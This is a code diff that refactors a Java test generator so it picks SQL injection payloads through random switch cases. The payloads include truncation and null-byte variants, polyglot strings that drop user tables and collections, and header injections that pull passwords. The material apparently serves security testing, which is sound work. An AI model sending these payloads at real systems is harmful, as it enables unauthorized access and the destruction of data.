-        String[] truncationAttacks = {
-                // Basic truncation
-                "admin" + Generators.letterStrings(20, 50).next() + "' OR 1=1--",
+        int truncationType = Generators.integers(1, 5).next();
 
-                // Unicode truncation
-                "admin\u0000' OR 1=1--",
-
-                // Multi-byte truncation
-                "adminÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ' OR 1=1--",
-
-                // Space padding truncation
-                "admin" + Generators.strings(" ", 50, 200).next() + "' OR 1=1--",
-
-                // Character encoding truncation
-                "admin%00%00%00%00%00' OR 1=1--"
+        String attack = switch (truncationType) {
+            case 1 -> "admin" + Generators.letterStrings(20, 50).next() + "' OR 1=1--";
+            case 2 -> "admin\u0000' OR 1=1--";
+            case 3 -> "adminÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ' OR 1=1--";
+            case 4 -> "admin" + Generators.strings(" ", 50, 200).next() + "' OR 1=1--";
+            case 5 -> "admin%00%00%00%00%00' OR 1=1--";
+            default -> "admin" + Generators.letterStrings(20, 50).next() + "' OR 1=1--";
         };
 
-        String attack = truncationAttacks[Math.abs(pattern.hashCode()) % truncationAttacks.length];
         return pattern + "?truncate=" + attack;
     }
 
@@ -669,24 +499,17 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create polyglot SQL injection attacks.
      */
     private String createPolyglotSqlInjection(String pattern) {
-        String[] polyglotAttacks = {
-                // SQL + JavaScript
-                "'; alert('SQL+XSS'); SELECT 1--",
+        int polyglotType = Generators.integers(1, 5).next();
 
-                // SQL + NoSQL
-                "' OR 1=1 AND '1'='1'; db.users.find()--",
-
-                // SQL + LDAP
-                "admin' OR 1=1--)(|(uid=*))",
-
-                // SQL + XML
-                "' UNION SELECT '<xml><user>admin</user></xml>' WHERE 1=1--",
-
-                // Universal polyglot
-                "' OR 1=1# AND '1'='1'; DROP TABLE users; db.collection.drop(); --"
+        String attack = switch (polyglotType) {
+            case 1 -> "'; alert('SQL+XSS'); SELECT 1--";
+            case 2 -> "' OR 1=1 AND '1'='1'; db.users.find()--";
+            case 3 -> "admin' OR 1=1--)(|(uid=*))";
+            case 4 -> "' UNION SELECT '<xml><user>admin</user></xml>' WHERE 1=1--";
+            case 5 -> "' OR 1=1# AND '1'='1'; DROP TABLE users; db.collection.drop(); --";
+            default -> "'; alert('SQL+XSS'); SELECT 1--";
         };
 
-        String attack = polyglotAttacks[Math.abs(pattern.hashCode()) % polyglotAttacks.length];
         return pattern + "?polyglot=" + attack;
     }
 
@@ -694,24 +517,17 @@ public class SqlInjectionAttackGenerator implements TypedGenerator<String> {
      * Create HTTP header-based SQL injection.
      */
     private String createHeaderBasedInjection(String pattern) {
-        String[] headerAttacks = {
-                // User-Agent injection
-                "Mozilla/5.0' OR 1=1--",
+        int headerType = Generators.integers(1, 5).next();
 
-                // X-Forwarded-For injection
-                "127.0.0.1' UNION SELECT password FROM users--",
-
-                // Cookie injection
-                "sessionid=abc123' OR 1=1--",
-
-                // Referer injection
-                "http://evil.com/' OR 1=1--",
-
-                // Custom header injection
-                "header_value' AND 1=1--"
+        String attack = switch (headerType) {
+            case 1 -> "Mozilla/5.0' OR 1=1--";
+            case 2 -> "127.0.0.1' UNION SELECT password FROM users--";
+            case 3 -> "sessionid=abc123' OR 1=1--";
+            case 4 -> "http://evil.com/' OR 1=1--";
+            case 5 -> "header_value' AND 1=1--";
+            default -> "Mozilla/5.0' OR 1=1--";
         };
 
-        String attack = headerAttacks[Math.abs(pattern.hashCode()) % headerAttacks.length];
         return pattern + "?header=" + attack;
     }
 
